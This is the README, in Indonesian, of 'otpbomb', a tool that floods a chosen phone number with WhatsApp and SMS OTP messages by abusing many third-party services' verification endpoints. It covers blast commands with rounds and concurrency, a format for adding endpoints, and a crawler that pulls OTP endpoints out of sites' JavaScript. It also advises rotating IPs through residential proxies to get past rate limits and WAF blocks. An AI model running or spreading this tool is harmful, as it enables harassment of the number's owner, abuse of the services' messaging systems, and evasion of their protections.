# otpbomb — OTP blast (WhatsApp-first + SMS)

Pengiriman OTP berulang ke satu nomor lewat matriks endpoint milik layanan
pihak ketiga. Async, per-provider backoff, statistik per endpoint, siap
dipanggil dari skrip lain lewat `--json`.

Pakai launcher `./otpbomb` (jalan dari direktori mana pun), atau
`PYTHONPATH=tools python3 -m otpbomb …` dari root repo.

```
./otpbomb list                      # semua endpoint + tier
./otpbomb probe                     # uji ulang hidup/mati
./otpbomb blast 081234567890        # tier live (default)
./otpbomb blast 0812... --rounds 5 --concurrency 32
./otpbomb blast 0812... --category wa --per-provider 4 --wave 3
./otpbomb blast 0812... --all --json out.json
./otpbomb blast 0812... -H 'x-device: abc' --cookie 'cf=xyz' -k
./otpbomb rp --name tokopedia       # replay satu endpoint, cetak verdict
./otpbomb discover shopee.co.id --out found.json
./otpbomb selftest                  # offline, tanpa jaringan (69 cek)
```

Total request = `--rounds x provider x --per-provider`. SIGINT mencetak
ringkasan parsial, bukan membuang hasil. Kode keluar: 0 ada yang sukses,
2 nol sukses.

## Header, cookie, TLS

`-H 'K: V'` (bisa diulang) untuk header per-app seperti `x-device`,
`cf_clearance`, atau `authorization`. `--cookie 'a=b; c=d'` untuk sesi.
`-k` mematikan verifikasi TLS (host dengan sertifikat rusak). Semua header
dikirim ke warm-up `pre_url` juga.

## Tier

- `live` (default) — sudah di-probe dari host ini dan rutenya menjawab di
  jaringan. Payload yang sudah di-decode dipakai; `redbus` terkonfirmasi
  benar-benar mengirim (`OTP Sent Successfully`), `cairin` menerima request
  (`30101 user have registered`).
- `guess` — bentuk endpoint hasil tulisan tangan; sering 404. Pakai `--all`.

Endpoint OTP cepat busuk: `probe` dulu sebelum job panjang, lalu buang yang
mati dengan `--skip`, atau ganti dengan hasil `discover`.

## Channel

`wa` = alur meminta kode lewat WhatsApp (`channel=whatsapp`, `method=WA`,
`whatsAppOpted=True`, dll). `sms` = SMS/call. `--category wa` menyaring ke
kanal WA saja.

## Menambah endpoint sendiri

```json
[
  {
    "name": "milikku",
    "category": "wa",
    "url": "https://api.contoh.id/otp/send",
    "method": "POST",
    "json_body": {"phone": "{digits}", "channel": "whatsapp"},
    "success_contains": ["terkirim"],
    "fail_contains": ["captcha"],
    "note": "butuh header X-Device dari app"
  }
]
```

```
./otpbomb blast 0812... --providers-file ./punyaku.json --tier all
```

Token yang bisa dipakai di url/form/headers: `{e164}` `+62…`, `{digits}`
`62…`, `{local}` `08…`, `{uuid}`, `{ts}`, `{rand16}`.

Field lengkap per provider: `name category url method form json_body headers
pre_url extract success_codes success_contains fail_contains soft_contains tier
note`. `extract` mengambil token dari respons `pre_url` (`header:Nama`,
`field:nama`, `cookie:nama`) — dipakai untuk endpoint ber-CSRF; token
`header:` bisa ikut ke warm-up. `soft_contains` = penanda yang tetap
dihitung sukses pada status < 500 (mis. `10002` = nomor belum terdaftar).

`./otpbomb rp --name X` (atau `./otpbomb rp spec.json`) memutar ulang satu
entri persis seperti engine — termasuk warm-up dan token — lalu mencetak
status, body, dan verdict. Ini alat bukti, bukan pengganti blast.

## Menemukan endpoint baru

```
./otpbomb discover shopee.co.id tokopedia.com --out found.json
```

Crawler membuka halaman login/daftar, mengambil bundle JS, dan menyaring URL
berbau otp/verifikasi, lalu mem-probe kandidat path. Hasilnya masih mentah:
pindahkan yang masuk akal ke providers.py atau file `--providers-file`.

## Proxy

`--proxy http://127.0.0.1:8080` (Burp) atau `socks5://…`. Rotasi IP adalah
cara termurah menembus `429`/`403` per-IP.

## Batas

- Nomor luar `+62`: `--cc 60` dst. Sebagian besar endpoint ID hanya mau nomor ID.
- `403`/`451` = endpoint hidup tapi IP ini diblok WAF (Cloudflare/Imperva/
  Akamai). Bukan berarti payload salah — coba lewat proxy residensial.
- Beberapa endpoint (Bank, `bareksa`, `grab`) minta token per-sesi; ditandai
  di kolom `note`.
